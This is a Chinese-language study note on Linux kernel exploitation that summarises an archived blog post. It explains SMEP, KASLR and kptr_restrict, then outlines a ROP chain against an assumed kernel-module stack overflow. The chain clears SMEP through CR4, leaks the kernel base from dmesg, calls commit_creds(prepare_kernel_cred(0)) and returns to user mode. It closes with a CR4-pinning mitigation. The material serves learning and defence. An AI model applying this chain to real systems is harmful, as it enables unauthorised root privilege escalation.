[Linux Kernel x86-64 bypass SMEP - KASLR - kptr_restric](https://web.archive.org/web/20171029060939/http://www.blackbunny.io/linux-kernel-x86-64-bypass-smep-kaslr-kptr_restric/)

几个内核保护

* SMEP  Supervisor Mode Execution Protection
  
  当处于内核态时，无法执行用户态的指令，主要用于防止虚拟机逃逸的代码执行

* KASLR  kernel address space layout randomization
  
  kernel的地址随机化，用来避免被ROP攻击

* Kernel Address Display Restriction
  
  在 /proc/kallsyms 下会显示所有的kernel symbol，而上面的选项就是用于控制显示的地址的格式
  
  * 0  默认，无限制
  
  * 1  除非用户有 CAP_ SYSLOG（是一个属性么），否则使用 %pK 打印的地址都会显示为0
  
  * 2  无论是什么用户，使用 %pK 打印的地址都显示为0
  
  该属性在 `/proc/sys/kernel/kptr_restrict` 下设置

这篇文章假设一个内核模块存在栈溢出，并通过构造利用链绕过上述几个保护进行提权

#### SMEP绕过

SMEP位在CR4寄存器的第20位

可以使用两个gadget进行绕过

```nasm
pop rdi
ret


mov cr4, rdi
ret
```

#### KASLR绕过

KASLR的绕过方法就是找一个没开KASLR和kptr保护的内核来找到地址的偏移量，因为即使开了KASLR，偏移也是相同的

#### exp

##### 使用dmesg泄露基地址

使用dmesg的这行来泄露地址

```
[    0.208567] Freeing SMP alternatives memory: 24K (ffffffffb9ea9000 - ffffffffb9eaf000)
```

计算ROP链上各个地址与该地址的偏移

##### ROP链

```
rop地址    ->    pop rdi;  ret;
新的CR4内容new_cr4
rop地址    ->    mov cr4, rdi;  pop rbp; ret;
新的rbp内容，这个随便写
getroot函数地址
rop地址    ->    swapgs; pop rbp; ret;
新的rbp内容，这个也随便写
rop地址    ->    iretq;    # 下面是iretq会从栈上pop出来的内容，因此在执行提权shellcode前需要保存原来的状态
shell函数地址               # RIP
user_cs                    # CS
user_eflags                # eflags
user_rsp                   # RSP
user_ss                    # SS
```

其中getroot函数包含了提权代码

```c
void getroot (void)  
{
  commit_creds(prepare_kernel_cred(0));
}
```

commit_creds和prepare_kernel_cred都是从内核符号中获取的

所以上述shellcode流程大体如下

* 首先通过
  
  ```nasm
  pop rdi
  ret
  
  mov cr4, rdi
  pop rbp ; 这句不重要
  ret
  ```
  
  这两段rop来关闭SMEP保护

* 调用用户代码的getroot函数获取root权限，其中getroot调用的函数是通过泄露基地址计算得到的函数地址，此外因为此时rop程序是在驱动中运行的，所以代码的执行权限为root

* 通过
  
  ```nasm
  swapgs
  pop rbp    ; 这句不重要
  ret
  
  iretq
  ```
  
  构造返回用户代码的rop链

[SWAPGS - OSDev Wiki](https://wiki.osdev.org/SWAPGS) 关于SWAPGS

#### 缓解

针对上述攻击，有下列应对方式

https://lwn.net/Articles/807904/

该方式加入了一个叫做pinned_bits的位，该位会在启动前设置，而当调用 write_cr4() 时会判断pinned_bits对应的位有没有被改过，若有则会把它们改回去

但其实也还是可以直接通过rop内核函数的方式来攻击

https://breaking-bits.gitbook.io/breaking-bits/exploit-development/linux-kernel-exploit-development/supervisor-mode-execution-protection-smep
